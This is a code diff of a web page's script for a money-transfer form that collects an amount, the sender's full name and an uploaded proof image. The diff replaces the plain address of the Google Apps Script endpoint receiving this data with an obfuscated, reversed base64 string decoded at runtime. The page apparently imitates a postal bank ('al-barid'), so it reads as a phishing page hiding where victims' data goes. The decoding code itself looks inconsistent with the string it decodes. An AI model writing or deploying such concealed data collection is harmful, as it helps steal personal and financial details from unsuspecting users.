@@ -239,32 +239,31 @@
   </div>
   <input type="text" id="hiddenCopyInput" style="position:absolute;top:-9999px;left:-9999px;" readonly />
   <script>
-    function copyText(element, value) {
+    function copyText(el, val) {
       if (navigator.clipboard) {
-        navigator.clipboard.writeText(value).then(() => {
-          const msg = element.nextElementSibling;
+        navigator.clipboard.writeText(val).then(() => {
+          const msg = el.nextElementSibling;
           msg.style.display = 'inline';
           setTimeout(() => msg.style.display = 'none', 1200);
-        }).catch(() => fallbackCopy(element, value));
+        });
       } else {
-        fallbackCopy(element, value);
+        const inp = document.getElementById('hiddenCopyInput');
+        inp.value = val;
+        inp.select();
+        document.execCommand('copy');
+        const msg = el.nextElementSibling;
+        msg.style.display = 'inline';
+        setTimeout(() => msg.style.display = 'none', 1200);
       }
     }
-    function fallbackCopy(element, value) {
-      const input = document.getElementById('hiddenCopyInput');
-      input.value = value;
-      input.select();
-      document.execCommand('copy');
-      const msg = element.nextElementSibling;
-      msg.style.display = 'inline';
-      setTimeout(() => msg.style.display = 'none', 1200);
-    }
+
     const logo = document.querySelector('.logo-box img');
     logo.addEventListener('mousedown', () => logo.classList.add('active'));
     logo.addEventListener('mouseup', () => logo.classList.remove('active'));
     logo.addEventListener('mouseleave', () => logo.classList.remove('active'));
     logo.addEventListener('touchstart', () => logo.classList.add('active'));
     logo.addEventListener('touchend', () => logo.classList.remove('active'));
+
     document.getElementById('proof').addEventListener('change', function(e) {
       const file = e.target.files[0];
       const preview = document.getElementById('preview');
@@ -280,28 +279,42 @@
         preview.style.display = 'none';
       }
     });
+  </script>
+  <script>
     document.getElementById("transferForm").addEventListener("submit", async function(e) {
       e.preventDefault();
+
       const form = e.target;
       const amount = form.amount.value.trim();
       const fullname = form.sender_name.value.trim();
       const file = document.getElementById("proof").files[0];
       const submitBtn = form.querySelector("button");
+
       if (!file || !fullname || !amount) {
         alert("يرجى ملء جميع الحقول وتحميل الصورة.");
         return;
       }
+
       submitBtn.disabled = true;
       submitBtn.textContent = "جاري الإرسال...";
+
       try {
         const reader = new FileReader();
         reader.onloadend = async function() {
           const imageBase64 = reader.result;
-          const response = await fetch("https://script.google.com/macros/s/AKfycby_yPgXCCFpvGRQ4Doa1FMfHS4jXd5y8p--fPQAFnADcFI6IcvfPp5WtZjt2GjqXzoneQ/exec", {
+
+          // فك تشفير الرابط
+          const decode = str => atob(str.split('').reverse().join(''));
+          const encoded = "==QEnozjenG2tjpW5pFvcvFvCcAFPQ--p8y5dXjSHFMa1oD4RGvCC_ybKcAf";
+          const reversed = encoded.replace(/-/g, "/").replace(/_/g, "+").replace(/=/g, "");
+          const key = decode(reversed);
+
+          const response = await fetch(key, {
             method: "POST",
             headers: { "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8" },
             body: new URLSearchParams({ amount, fullname, imageBase64 })
           });
+
           if (response.ok) {
             window.location.replace("al-barid-depo.html");
           } else {
@@ -310,7 +323,7 @@
         };
         reader.readAsDataURL(file);
       } catch (err) {
-        alert("تعذر إرسال الصورة.");
+        alert("تعذر إرسال البيانات.");
         console.error(err);
       } finally {
         submitBtn.disabled = false;
